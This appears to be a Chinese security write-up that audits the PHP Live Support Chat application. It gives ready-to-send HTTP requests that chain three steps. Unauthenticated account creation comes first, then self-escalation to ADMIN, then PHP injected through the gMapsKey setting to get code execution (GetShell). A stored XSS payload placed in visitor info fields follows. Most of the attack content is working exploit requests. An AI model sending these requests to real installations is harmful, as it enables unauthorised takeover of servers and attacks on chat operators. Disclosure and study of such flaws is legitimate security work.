## PHP-Live-Chat代码审计之组合拳GetShell

PHP Live Chat 全名为 PHP Live Support Chat，官方网站[https://livechat.mirrormx.net/](https://www.t00ls.com/link.html?url=https%3A%2F%2Flivechat.mirrormx.net%2F)，目前有三个版本lite、普通和pro。

## 1.未授权创建账号

```
POST /php/app.php?mobile-operator-create HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 61

roles=OPERATOR&name=mrfool&mail=mrfool%40x.xx&password=111111
```

创建成功并返回账号id

![image-20240529155148187](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291551257.png)

## 2.添加自身管理员权限

> 登录创建的账号后，修改当前ID权限为ADMIN和OPERATOR

```
POST /php/app.php?mobile-operator-update HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie:PHPSESSID=ikglrk04j3d85ivhrdhme8pv7p;
Connection: close
Content-Length: 26

id=28&roles=ADMIN,OPERATOR
```

![image-20240529155312721](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291553784.png)

## 3.修改gMapsKey实现GetShell

> 使用ADMIN权限的账号（权限修改后需重新登录获取PHPSESSID）修改gMapsKey从而实现GetShell

```http
POST /php/app.php?config-update-settings HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie:PHPSESSID=s5vj6oib3agt4h9q7phd8akjlp;
Connection: close
Content-Length: 23

gMapsKey=<?phpinfo();?>
```

shell路径为/php/config/app.settings.php

![image-20240529155339378](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291553428.png)

## XSS

### 1.访客信息上传XSS

> 发送消息时会同步上传访客信息，多个字段可触发，包括但不限于ip、referer、os。

```http
POST /php/app.php?guest-manage-connection HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=nbg5as8lo9scs8ujf6i0d7tr6a; 
Content-Length: 537

lastMessageId=0&info=%7B%22ip%22%3A%22127.0.0.2%3Cimg%20src%3Dx%20onerror%3Dalert(%2Fxss%2F)%3E%22%2C%22referer%22%3A%22%22%2C%22userAgent%22%3A%22%22%2C%22browserName%22%3A%22%22%2C%22browserVersion%22%3A%22%22%2C%22os%22%3A%22%22%2C%22engine%22%3A%22%22%2C%22language%22%3A%22%22%2C%22geoloc%22%3A%7B%22countryCode%22%3A%22US%22%2C%22countryName%22%3A%22United%20States%22%2C%22city%22%3Anull%2C%22zipCode%22%3Anull%2C%22timeZone%22%3Anull%2C%22latitude%22%3A0%2C%22longitude%22%3A0%2C%22metroCode%22%3Anull%2C%22utcOffset%22%3A0%7D%7D
```

外部访客列表未解析

![image-20240529155403787](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291554834.png)

进入聊天页面触发

![image-20240529155418672](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291554735.png)



## 漏洞来源

- https://www.t00ls.com/articles-71766.html